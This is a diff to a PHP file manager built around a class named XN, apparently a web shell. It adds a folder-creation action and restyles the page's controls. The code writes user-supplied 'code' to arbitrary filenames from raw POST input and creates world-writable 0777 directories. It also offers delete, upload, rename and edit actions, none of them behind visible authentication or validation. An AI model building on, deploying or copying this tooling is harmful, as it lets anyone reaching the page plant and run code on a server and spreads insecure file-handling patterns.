@@ -124,16 +124,19 @@ class XN {
                     break;
             } return $result;
         }
-        public static function addFile($filename, $data) {
-            foreach ($filename as $value) {
-                $handle = fopen($value, "w");
-                if (fwrite($handle, $data)) {
-                    print("success");
-                } else {
-                    print("failed");
-                }
+    public static function addFile($filename, $data) {
+    	foreach ($filename as $value) {
+    		$handle = fopen($value, "w");
+    		if (fwrite($handle, $data)) {
+    			print("success");
+            } else {
+            	print("failed");
             }
         }
+    }
+    public static function addfolder($path, $mode = 0777) {
+    	return (!is_dir($path) && (!mkdir($path, $mode)));
+  	}
     public static function delete($filename) {
         if (is_dir($filename)) {
             $scandir = scandir($filename);
@@ -336,9 +339,7 @@ function head($x, $y, $class = null) {
                     </button>
                 </li>
                 <li>
-                    <button type="button" onclick="$(document).ready(function () {  
-                        jqxAlert.alert('maintenance');  
-                    })">
+                    <button name="action" value="adddir">
                         <div class="icon">
                             <a><i class="fa fa-plus-square" aria-hidden="true"></i></a>
                         </div>
@@ -413,8 +414,6 @@ function alert($message) {
     }
     .count {
     	z-index: 99999;
-    	margin-top:-20px;
-    	padding-top: 10px;
     	text-align: center;
         padding:10px;
         padding-left:15px;
@@ -424,9 +423,27 @@ function alert($message) {
     	
     }
     .count select {
-    	width:50%;
     	padding:7px;
+        width:100%;
+        border-radius: 5px;
+        border: 1px solid #ebebeb;
+        background: #ebebeb;
+        outline: none;
     }
+    .all {
+    	display: inline-block;
+    	width:150px;
+    	text-align: left;
+    }
+	.select {
+		width:270px;
+		display: inline-block;
+	}
+	.total {
+		width:150px;
+		text-align: right;
+		display: inline-block;
+	}
     .back .mobile {
         padding-left:25px;
         width:98%;
@@ -499,9 +516,10 @@ function alert($message) {
         width:50%;
     }
     .table {
-        padding:20px;
+        padding-left:20px;
+        padding-right: 20px;
         overflow: auto;
-        height:390px;
+        height:410px;
 
     }
     .rewrite-success {
@@ -530,6 +548,7 @@ function alert($message) {
     }
     .rewrite,
     .addfile,
+    .adddir,
     .upload,
     .rename,
     .edit {
@@ -538,6 +557,7 @@ function alert($message) {
     }
     .rewrite table td,
     .addfile table td,
+    .adddir table td,
     .upload table td,
     .rename table td,
     .edit table td {
@@ -558,6 +578,7 @@ function alert($message) {
     }
     .rewrite input[type=submit],
     .addfile input[type=submit],
+    .adddir input[type=submit],
     .upload input[type=submit],
     .rename input[type=submit],
     .edit input[type=submit] {
@@ -1043,6 +1064,42 @@ function filterTable() {
 				<?php
         	exit();
         	break;
+        case 'adddir':
+        	if (isset($_POST['adddir'])) {
+        		$dirname = $_POST['dirname'];
+        		for ($i=0; $i < count($dirname) ; $i++) { 
+        			$explode = explode(' ', $dirname[$i]);
+        			foreach ($explode as $value) {
+        				if (XN::addfolder($value)) {
+        					alert('failed');
+        				} else {
+        					alert("success");
+        				}
+        			}
+        		}
+        	}
+        	head('Add Folder', getcwd(), 'hidden');
+        	?>
+        	<div class="adddir">
+        		<table>
+        			<form method="post">
+        				<tr>
+        					<td>
+        						<input type="text" name="dirname[]" placeholder="dirname">
+        					</td>
+        				</tr>
+        				<tr>
+        					<td>
+        						<input type="submit" name="adddir">
+        						<input type="hidden" name="action" value="adddir">
+        					</td>
+        				</tr>
+        			</form>
+        		</table>
+        	</div>
+        	<?php
+        	exit();
+        	break;
         case 'addfile':
             if (isset($_POST['addfile'])) {
                 XN::addfile($_POST['filename'], $_POST['data']);
@@ -1054,7 +1111,7 @@ function filterTable() {
                     <form method="post">
                         <tr>
                             <td>
-                                <input type="text" name="filename[]">
+                                <input type="text" name="filename[]" placeholder="filename">
                             </td>
                             <td style="display: none;"><a id="add_input">add</a></td>
                         </tr>
@@ -1065,7 +1122,7 @@ function filterTable() {
                         </tr>
                         <tr>
                             <td>
-                                <textarea name="data"></textarea>
+                                <textarea style="height:400px;" name="data" placeholder="your code"></textarea>
                             </td>
                         </tr>
                         <tr>
@@ -1463,15 +1520,21 @@ function filterTable() {
     </div>
     <form method="post" action="?x=<?= getcwd() ?>">
     	<div class="count">
-    		<input type="checkbox"> Select All
-    		<select name="" onchange='if(this.value != 0) { this.form.submit(); }'>
-    			<option disabled selected>Action</option>
-    			<option>Delete</option>
-    			<option>Backup</option>
-    		</select>
-        	<span>
-        		Total Files : <?= XN::countAllFiles(getcwd()) ?>
-        	</span>
+    		<div class="all">
+    			<input type="checkbox"> Select All
+    		</div>
+    		<div class="select">
+    			<select name="" onchange='if(this.value != 0) { this.form.submit(); }'>
+    				<option disabled selected>Action</option>
+    				<option>Delete</option>
+    				<option>Backup</option>
+    			</select>
+    		</div>
+    		<div class="total">
+    			<span>
+        			Total Files : <?= XN::countAllFiles(getcwd()) ?>
+        		</span>
+    		</div>
     	</div>
 	</form>
 </div>
